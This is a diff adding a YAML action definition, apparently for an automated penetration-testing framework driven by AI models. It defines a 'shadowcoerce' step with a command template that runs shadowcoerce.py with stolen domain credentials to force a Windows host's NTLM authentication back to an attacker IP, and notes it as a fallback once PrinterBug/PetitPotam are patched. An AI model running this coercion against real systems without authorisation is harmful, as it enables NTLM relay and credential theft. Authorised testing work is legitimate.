@@ -1,0 +1,17 @@
+name: shadowcoerce
+category: services
+description: ShadowCoerce (MS-FSRVP)
+preconditions:
+  - os==windows
+  - has_cred
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "python3 shadowcoerce.py -d {domain} -u '{username}' -p '{password}' {attacker_ip} {target_ip}"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "MS-FSRVP File Server VSS Agent service coercion. Forces NTLM auth callback. Alternative when PrinterBug/PetitPotam are patched."
